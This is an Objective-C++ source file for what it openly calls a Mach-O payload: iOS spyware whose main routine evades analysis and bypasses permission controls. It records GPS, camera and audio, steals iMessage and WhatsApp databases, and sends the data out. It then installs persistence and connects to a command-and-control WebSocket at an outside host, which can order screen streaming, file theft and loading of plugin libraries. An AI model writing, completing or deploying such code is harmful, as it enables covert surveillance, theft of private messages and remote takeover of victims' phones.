// FILE: main.mm
#import <Foundation/Foundation.h>
#include <iostream>
#include <dlfcn.h>
#include <thread> // Required for background streaming

#include "evasion.mm"
#include "database.mm"
#include "network.mm"
#include "hardware.mm"
#include "persistence.mm"

// ============================================================================
// GLOBAL WEBSOCKET & CALLBACK
// ============================================================================
NSURLSessionWebSocketTask *globalWebSocket = nil;

// This is called by screen_stream.mm to send the Base64 image to AWS
void send_frame_to_c2(NSString *base64Image) {
    if (globalWebSocket) {
        NSDictionary *msg = @{@"type": @"screen_frame", @"image": base64Image};
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:msg options:0 error:nil];
        [globalWebSocket sendMessage:[[NSURLSessionWebSocketMessage alloc] initWithData:jsonData] completionHandler:^(NSError * _Nullable error) {}];
    }
}

// ============================================================================
// PLUGIN LOADER
// ============================================================================
void execute_plugin(std::string plugin_name) {
    std::string path = "/var/mobile/Library/Caches/" + plugin_name + ".dylib";
    std::cout << "[*] Attempting to load plugin: " << path << "\n";
    
    void* handle = dlopen(path.c_str(), RTLD_LAZY);
    if (!handle) {
        std::cout << "[-] Failed to load plugin: " << dlerror() << "\n";
        return;
    }

    void (*start_func)() = (void(*)())dlsym(handle, "start");
    if (start_func) {
        std::cout << "[+] Executing plugin...\n";
        start_func(); 
    } else {
        std::cout << "[-] Could not find 'start' symbol in plugin.\n";
    }
}

// ============================================================================
// WEBSOCKET COMMAND LOOP
// ============================================================================
void start_websocket_c2() {
    std::cout << "[*] Connecting to C2 WebSocket...\n";
    
    NSURL *url = [NSURL URLWithString:@"ws://security-pass.abrdns.com"];
    NSURLSession *session = [NSURLSession sharedSession];
    globalWebSocket = [session webSocketTaskWithURL:url];
    
    [globalWebSocket resume];
    
    // Register as the device
    NSDictionary *connectMsg = @{@"type": @"device_connect", @"device": @"iPhone"};
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:connectMsg options:0 error:nil];
    [globalWebSocket sendMessage:[[NSURLSessionWebSocketMessage alloc] initWithData:jsonData] completionHandler:^(NSError * _Nullable error) {}];

    // Listen for commands
    while (true) {
        dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
        
        [globalWebSocket receiveMessageWithCompletionHandler:^(NSURLSessionWebSocketMessage * _Nullable message, NSError * _Nullable error) {
            if (message && message.type == NSURLSessionWebSocketMessageTypeData) {
                NSDictionary *json = [NSJSONSerialization JSONObjectWithData:message.data options:0 error:nil];
                NSString *command = json[@"command"];
                
                if ([command isEqualToString:@"start_screen"]) {
                    std::cout << "[C2] Received command: start_screen\n";
                    // Run the screen streamer in a separate thread so it doesn't block the WebSocket
                    std::thread([](){
                        execute_plugin("screen_stream");
                    }).detach();
                } 
                else if ([command isEqualToString:@"file_steal"]) {
                    std::cout << "[C2] Received command: file_steal\n";
                    execute_plugin("file_stealer");
                }
                else if ([command isEqualToString:@"touch"]) {
                    int x = [json[@"x"] intValue];
                    int y = [json[@"y"] intValue];
                    std::cout << "[C2] Received touch event: X=" << x << " Y=" << y << "\n";
                    // execute_plugin("remote_control");
                }
            } else if (error) {
                std::cout << "[-] WebSocket Error: " << [[error localizedDescription] UTF8String] << "\n";
                break; // Exit loop on error
            }
            dispatch_semaphore_signal(semaphore);
        }];
        
        dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
    }
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================
int main(int argc, char * argv[]) {
    @autoreleasepool {
        std::cout << "========================================\n";
        std::cout << " [*] Mach-O Payload Initialized\n";
        std::cout << "========================================\n";

        // 1. EVASION CHECK
        EvasionModule::AntiAnalysis evasion;
        if (!evasion.check_environment()) {
            evasion.kill_switch();
            return 0; 
        }

        // 2. TCC BYPASS
        evasion.bypass_tcc_permissions();

        // 3. HARDWARE SURVEILLANCE
        HardwareModule::Surveillance spy;
        spy.get_gps_location();
        spy.capture_camera_frame(); 
        spy.start_audio_recording(10);

        // 4. DATABASE THEFT
        DatabaseModule::DatabaseExtractor db;
        db.extract_imessage();
        db.extract_whatsapp();
        std::string stolen_data = db.compile_all_data();

        // 5. NETWORK EXFILTRATION
        NetworkModule::Exfiltrator net;
        net.send_payload(stolen_data);

        // 6. PERSISTENCE
        PersistenceModule::Anchor anchor;
        anchor.establish_persistence();

       // 7. START WEBSOCKET COMMAND LOOP (Waits for GUI commands)
        std::cout << "\n========================================\n";
        std::cout << "[*] Entering WebSocket Command Loop...\n";
        std::cout << "========================================\n";
        
        // Keep trying to connect forever (The fix!)
        while (true) {
            start_websocket_c2(); 
            std::cout << "[-] WebSocket disconnected. Reconnecting in 10 seconds...\n";
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }

    } // <-- This closes the @autoreleasepool
    return 0;
} // <-- This closes int main()